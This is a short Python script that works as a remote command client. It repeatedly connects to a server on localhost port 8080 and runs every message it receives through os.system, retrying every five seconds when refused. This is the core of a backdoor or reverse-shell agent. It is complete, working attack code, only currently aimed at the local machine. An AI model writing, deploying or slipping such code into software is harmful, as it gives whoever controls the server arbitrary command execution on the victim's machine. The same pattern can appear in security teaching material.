import socket
import time
import signal
import sys

from os import system

running = True

def signal_handler(sig, frame):
    global running
    print("\n[*] Shutting down...")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def connect():
    global running
    
    while running:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("[*] Connecting to localhost:8080...")
            
            client.connect(('localhost', 8080))
            print("[*] Connected!")
            
            while running:
                data = client.recv(1024)
                
                if not data:
                    print("[*] Server closed connection")
                    break
                
                system(data.decode())
            
            client.close()
            print("[*] Connection closed")
            
        except ConnectionRefusedError:
            print("[*] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    connect()
